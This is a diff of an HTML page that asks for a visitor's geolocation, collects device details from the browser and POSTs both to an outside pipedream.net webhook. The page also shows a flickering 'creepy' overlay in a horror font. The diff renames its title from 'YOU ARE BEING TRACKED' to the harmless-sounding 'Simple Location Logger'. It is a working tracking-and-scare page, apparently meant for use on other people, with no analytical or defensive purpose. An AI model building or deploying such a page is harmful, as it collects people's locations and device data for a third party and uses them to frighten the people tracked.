@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>YOU ARE BEING TRACKED</title>
+  <title>Simple Location Logger</title>
   
-  <!-- Google Fonts -->
+  <!-- Google Fonts preload -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Nosifer&display=swap" rel="stylesheet">
@@ -27,18 +27,19 @@
       height: 100vh;
       width: 100vw;
       background-color: darkred;
-      display: none; /* start hidden */
+      display: flex;
       justify-content: center;
       align-items: center;
       color: white;
       font-family: 'Nosifer', cursive;
       text-align: center;
       z-index: 9999;
-      font-size: 10vw;
+      font-size: 10vw; /* scales for phones/tablets too */
       line-height: 1.2;
       animation: flicker 1.5s infinite;
     }
 
+    /* Flicker animation for creepy effect */
     @keyframes flicker {
       0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% { opacity: 1; }
       20%, 22%, 24%, 55% { opacity: 0.2; }
@@ -51,9 +52,17 @@
       text-align: center;
     }
 
-    /* Responsive font sizes */
-    @media (max-width: 768px) { #warning { font-size: 15vw; } }
-    @media (max-width: 480px) { #warning { font-size: 20vw; } }
+    /* Optional: make overlay text responsive */
+    @media (max-width: 768px) {
+      #warning {
+        font-size: 15vw;
+      }
+    }
+    @media (max-width: 480px) {
+      #warning {
+        font-size: 20vw;
+      }
+    }
   </style>
 </head>
 <body>
@@ -65,10 +74,12 @@
   <p>Click allow to send your coordinates</p>
 
   <script>
+    // Detect device info
     function getDeviceInfo() {
       const ua = navigator.userAgent;
       const platform = navigator.platform;
       let deviceType = "Unknown";
+
       if (/Mobi|Android/i.test(ua)) deviceType = "Mobile";
       else if (/iPad|Tablet/i.test(ua)) deviceType = "Tablet";
       else deviceType = "Desktop";
@@ -87,11 +98,11 @@
       };
     }
 
+    // Request geolocation
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         (pos) => {
           const deviceInfo = getDeviceInfo();
-          // Send coordinates + device info
           fetch("https://eo6f81z4derf3yg.m.pipedream.net", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -103,10 +114,6 @@
             })
           });
           console.log("Coords + device info sent!");
-
-          // SHOW the warning overlay
-          const warning = document.getElementById('warning');
-          warning.style.display = 'flex';  // use flex to make it appear properly
         },
         (err) => console.error("Geo error:", err)
       );
